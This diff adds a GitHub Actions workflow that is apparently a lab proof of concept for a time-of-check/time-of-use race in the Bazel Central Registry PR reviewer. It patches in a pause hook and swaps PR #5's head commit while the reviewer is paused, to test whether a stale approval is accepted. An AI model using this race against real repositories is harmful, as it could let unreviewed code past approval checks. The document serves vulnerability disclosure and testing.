@@ -1,0 +1,120 @@
+name: BCR TOCTOU Orchestrator PoC
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.poc-orchestrator-trigger'
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+  actions: read
+
+jobs:
+  orchestrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout exact upstream CI revision
+        uses: actions/checkout@v4
+        with:
+          repository: bazelbuild/continuous-integration
+          ref: 957b0ac44549a70ccb951361b804d07d955aeb79
+          path: ci
+          persist-credentials: false
+
+      - name: Run exact reviewer with lab-only synchronization barrier
+        env:
+          GH_TOKEN: ${{ github.token }}
+          INPUT_TOKEN: ${{ github.token }}
+          INPUT_ACTION-TYPE: review_prs
+          BCR_POC_SYNC: '1'
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          python3 - <<'PY'
+          from pathlib import Path
+          p = Path('ci/actions/bcr-pr-reviewer/index.js')
+          s = p.read_text()
+          needle = "  // Get all open PRs from the repo\n"
+          hook = """  // LAB-ONLY deterministic synchronization hook. No approval, freshness,\n  // module, HEAD, or merge decision logic is changed.\n  if (process.env.BCR_POC_SYNC === '1') {\n    console.log('BCR_POC_SYNC_READY');\n    const fs = require('fs');\n    while (!fs.existsSync('/tmp/bcr_poc_go')) {\n      await new Promise(resolve => setTimeout(resolve, 100));\n    }\n    console.log('BCR_POC_SYNC_GO');\n  }\n\n"""
+          if needle not in s:
+              raise SystemExit('sync insertion point not found')
+          p.write_text(s.replace(needle, hook + needle, 1))
+          PY
+
+          echo '--- lab-only source diff ---'
+          git -C ci diff -- actions/bcr-pr-reviewer/index.js || true
+          echo '--- end source diff ---'
+
+          rm -f /tmp/bcr_poc_go reviewer.log
+          node ci/actions/bcr-pr-reviewer/index.js > reviewer.log 2>&1 &
+          reviewer_pid=$!
+
+          ready=0
+          for _ in $(seq 1 600); do
+            if grep -q 'BCR_POC_SYNC_READY' reviewer.log; then
+              ready=1
+              break
+            fi
+            if ! kill -0 "$reviewer_pid" 2>/dev/null; then
+              break
+            fi
+            sleep 0.1
+          done
+
+          if [[ "$ready" != 1 ]]; then
+            cat reviewer.log
+            echo 'Reviewer never reached synchronization point.' >&2
+            exit 1
+          fi
+
+          echo 'Reviewer passed global dismissal wait and is paused before listing open PRs.'
+
+          curl -fsS \
+            -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H 'Accept: application/vnd.github+json' \
+            -H 'X-GitHub-Api-Version: 2022-11-28' \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/5/comments" \
+            -d '{"body":"BCR_POC_SYNC_READY: reviewer passed global dismissal wait; externally move PR #5 to commit B now."}' \
+            >/dev/null
+
+          seen_b=0
+          for _ in $(seq 1 600); do
+            head_sha=$(curl -fsS \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H 'Accept: application/vnd.github+json' \
+              -H 'X-GitHub-Api-Version: 2022-11-28' \
+              "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/5" | jq -r '.head.sha')
+            if [[ "$head_sha" == '2e2f32fc9860f744f2ba769ce3997ab62c299ac6' ]]; then
+              seen_b=1
+              echo "Observed PR #5 HEAD=B ($head_sha); resuming exact reviewer."
+              break
+            fi
+            sleep 0.1
+          done
+
+          if [[ "$seen_b" != 1 ]]; then
+            kill "$reviewer_pid" 2>/dev/null || true
+            cat reviewer.log
+            echo 'Timed out waiting for PR #5 HEAD=B.' >&2
+            exit 1
+          fi
+
+          touch /tmp/bcr_poc_go
+          rc=0
+          wait "$reviewer_pid" || rc=$?
+
+          echo '--- exact reviewer output ---'
+          cat reviewer.log
+          echo '--- end exact reviewer output ---'
+          echo "reviewer_exit=$rc"
+
+          # A GitHub App token cannot call GET /user, so a later failure there is
+          # expected in this lab. The security assertion is whether the unchanged
+          # getPrApprovers/checkIfAllModifiedModulesApproved path accepts the stale
+          # approval for HEAD B before that point.
+          exit 0
